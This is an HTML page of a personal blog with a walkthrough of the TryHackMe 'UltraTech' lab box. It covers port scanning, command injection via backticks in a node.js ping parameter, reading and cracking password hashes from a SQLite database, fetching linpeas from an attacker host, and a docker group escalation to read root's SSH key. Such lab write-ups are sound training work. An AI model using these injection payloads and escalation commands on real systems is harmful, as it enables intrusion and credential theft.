<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="UltraTech is a medium difficult box on TryHackMe. Below are the steps I took to fully compromise this box.
Task 1 just requires deploying the machine, there is no challenge to solve.
Task 2 First, let&rsquo;s run enumeration, the questions hint that non standard ports are used, so I ran nmap -p- [machine ip]. This took a bit to run since it was enumerating all the services on each port over the entire TCP port range."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content=" UltraTech - TryHackMe"><meta name=twitter:description content="UltraTech is a medium difficult box on TryHackMe. Below are the steps I took to fully compromise this box.
Task 1 just requires deploying the machine, there is no challenge to solve.
Task 2 First, let&rsquo;s run enumeration, the questions hint that non standard ports are used, so I ran nmap -p- [machine ip]. This took a bit to run since it was enumerating all the services on each port over the entire TCP port range."><meta property="og:title" content=" UltraTech - TryHackMe"><meta property="og:description" content="UltraTech is a medium difficult box on TryHackMe. Below are the steps I took to fully compromise this box.
Task 1 just requires deploying the machine, there is no challenge to solve.
Task 2 First, let&rsquo;s run enumeration, the questions hint that non standard ports are used, so I ran nmap -p- [machine ip]. This took a bit to run since it was enumerating all the services on each port over the entire TCP port range."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2020-07-15-ultratech/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2020-07-15T00:00:00+00:00"><meta property="article:modified_time" content="2020-07-15T00:00:00+00:00"><title>UltraTech - TryHackMe · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2020-07-15-ultratech/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.107.0"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2020-07-15-ultratech/>UltraTech - TryHackMe</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2020-07-15T00:00:00Z>July 15, 2020</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
4-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/ultratech/>UltraTech</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/tryhackme/>TryHackMe</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/node.js-api/>node.js API</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/docker/>docker</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/hash-cracking/>hash cracking</a></span></div></div></header><div><p>UltraTech is a medium difficult box on <a href=https://www.tryhackme.com>TryHackMe</a>. Below are the steps I took to fully compromise this box.</p><p>Task 1 just requires deploying the machine, there is no challenge to solve.</p><h3 id=task-2>Task 2
<a class=heading-link href=#task-2><i class="fa fa-link" aria-hidden=true></i></a></h3><p>First, let&rsquo;s run enumeration, the questions hint that non standard ports are used, so I ran <strong>nmap -p- [machine ip]</strong>. This took a bit to run since it was enumerating all the services on each port over the entire TCP port range. After a while, it returned the following results.</p><p><img src=/assets/img/UltraTech1.png alt="UltraTech nmap1"></p><p>Now lets run <strong>nmap -A -p 21,22,8081,31331,35143 [machine ip]</strong> to enumerate these services further, which gets you the following information.</p><p><img src=/assets/img/UltraTech2.png alt="UltraTech nmap2"></p><p>We should now be able to answer some of the questions for this task. <strong>Question 1</strong> is shown above, which is node.js. <strong>Question 2</strong> is going to be the port Apache is running on that is not standard, which is the name of the service that answers <strong>Question 3</strong>.</p><p><strong>Question 4</strong> is also in the scan above, which includes the name of the OS.</p><p><strong>Question 5</strong> probably has several ways to figure it out, but I decided to enumerate the website on port 31331 to see what all was there. I enumerated the website with <strong>gobuster dir -u http://[machine ip]:31331 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50</strong>. Within a few moments, several directories showed up.</p><p><img src=/assets/img/UltraTech3.png alt="UltraTech gobuster"></p><p>Let&rsquo;s start looking at these directories. Since we know node.js is running, let&rsquo;s go to the <strong>/js</strong> directory first.</p><p><img src=/assets/img/UltraTech4.png alt></p><p>This lists 3 different JavaScript files. Let&rsquo;s take a look at api.js.</p><p><img src=/assets/img/UltraTech5.png alt="UltraTech api.js"></p><p>This provides us with the answer to the question related to routes, as this script references port 8081 (where Node.js is setup). The two URLs indicated above are the routes that are in place, so the answer to this question is <strong>2</strong>. The other two files are just JavaScript scripts, and do not reference Node.js at all.</p><h3 id=task-3>Task 3
<a class=heading-link href=#task-3><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Now that we know the routes, it appears one of them is used for authentication. Let&rsquo;s see if we can figure out how to login. Visiting <strong>http://[machine ip]:8081/auth</strong> tells you you must specify a login and a password. Let&rsquo;s add in these two fields (login and password) to a request and see what happens. Let&rsquo;s use <strong>http://[machine-ip]/auth?login=root&password=root</strong>. It appears this request is in the correct format, as it tells us we&rsquo;re using invalid credentials.</p><p><img src=/assets/img/UltraTech6.png alt="UltraTech auth"></p><p>Next, let&rsquo;s look at the other route of <strong>http://[machine ip]:8081/ping?ip=</strong>. Let&rsquo;s use the backtick here to and enter in another command to see if we can perform command injection. I elected to use <strong>http://[machine ip]:8081/ping?ip=`whoami`</strong>.</p><p><img src=/assets/img/UltraTech7.png alt="UltraTech node.js command injection whoami"></p><p>Success! It returned a user of <strong>www</strong>. Next, let&rsquo;s see what&rsquo;s in the current directory with <strong>http://[machine ip]:8081/ping?ip=`ls`</strong>.</p><p><img src=/assets/img/UltraTech8.png alt="UltraTech node.js command injection ls"></p><p>This would be the answer to <strong>Question 1</strong> for Task 3.</p><p>It appears there is a sqlite database present. Let&rsquo;s view the contents with <strong>http://[machine ip]:8081/ping?ip=`cat [database name]`</strong>.</p><p><img src=/assets/img/UltraTech9.png alt="UltraTech node.js command injection cat"></p><p>This provides you with the hashes for two users, <strong>r00t</strong>, and <strong>admin</strong>. The hash for r00t is the answer to <strong>Question 2</strong> for Task 3Let&rsquo;s save their hashes to a text file named <strong>hashes.txt</strong>, one per line and see if we can crack them. Once saved, let&rsquo;s run the following command <strong>john hashes.txt &ndash;format=Raw-MD5 &ndash;wordlist=/usr/share/wordlists/rockyou.txt</strong>.</p><p><img src=/assets/img/UltraTech10.png alt="UltraTech john"></p><p>This will give you the credentials for both users. The password for r00t is the answer to <strong>Question 3</strong> for Task 3.</p><h3 id=task-4>Task 4
<a class=heading-link href=#task-4><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Next, let&rsquo;s connect with <strong>ssh r00t@[machine ip]</strong> and enter the password we had cracked a few moments ago. The final task wants us to get root&rsquo;s first 9 characters of their private SSH key. Let&rsquo;s spin up a python server locally on our attacker pc with <strong>python3 -m http.server</strong>. From the victim PC, type in <strong>wget http://[attacker machine ip]:8000/linpeas.sh</strong>. Once downloaded, run <strong>chmod +x linpeas.sh</strong> and run it with <strong>./linpeas.sh</strong>.</p><p><img src=/assets/img/UltraTech13.png alt="UltraTech linpeas.sh"></p><p>Right at the very beginning, we find out that r00t is a member of the docker group. We could potentially escalate to root with this by following what is on the <a href=https://gtfobins.github.io/gtfobins/docker/>GTFOBins</a> site for docker. However, since this machine doesn&rsquo;t have internet access, let&rsquo;s first list what images are available locally with <strong>docker image ls</strong></p><p><img src=/assets/img/UltraTech14.png alt="UltraTech docker image ls"></p><p>Now, let&rsquo;s modify the command on the GTFOBins site above from docker run -v /:/mnt &ndash;rm -it alpine chroot /mnt sh to <strong>docker run -v /:/mnt &ndash;rm -it bash chroot /mnt sh</strong>. From here, navigate to the ssh keys folder with root with <strong>cd root, cd .ssh</strong> and <strong>cat id_rsa</strong> to answer <strong>Question 1</strong> for Task 4 and complete this box.</p><p><img src=/assets/img/UltraTech15.png alt></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2022
Kiel Vaughn</section></footer></main><script src=/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script></body></html>